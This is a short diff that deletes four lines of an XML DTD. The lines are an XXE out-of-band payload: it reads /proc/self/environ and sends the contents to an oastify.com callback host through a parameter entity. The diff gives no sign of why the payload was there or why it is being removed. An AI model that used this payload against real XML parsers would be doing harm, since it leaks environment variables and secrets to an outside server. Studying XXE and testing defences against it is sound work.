@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///proc/self/environ">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://zfih5uimttdp6sdkjax2ucybs2ytmmrag.oastify.com/?x=%file;'>">
-%eval;
-%exfiltrate;
